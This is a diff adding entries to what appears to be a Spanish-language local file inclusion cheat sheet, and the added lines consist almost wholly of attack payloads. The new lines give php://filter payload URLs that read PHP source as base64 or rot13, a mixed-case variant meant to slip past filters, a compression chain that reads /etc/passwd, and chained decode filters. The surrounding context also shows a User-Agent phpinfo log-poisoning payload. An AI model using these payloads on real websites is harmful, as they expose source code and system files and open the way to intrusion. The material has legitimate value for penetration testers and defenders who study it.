@@ -1784,6 +1784,24 @@ User-Agent: <?=phpinfo(); ?>
 
 ##### Wrapper php://filter
 
+```bash
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+```
+
+Se puede jugar con otro wrapper de compresión en caso de contar con un archivo muy grande:
+
+```bash
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+```
+
+Así mismo, los wrappers también pueden ser encadenados:
+
+```bash
+php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
+```
+
 ##### Wrapper zip://
 
 ##### Wrapper data://
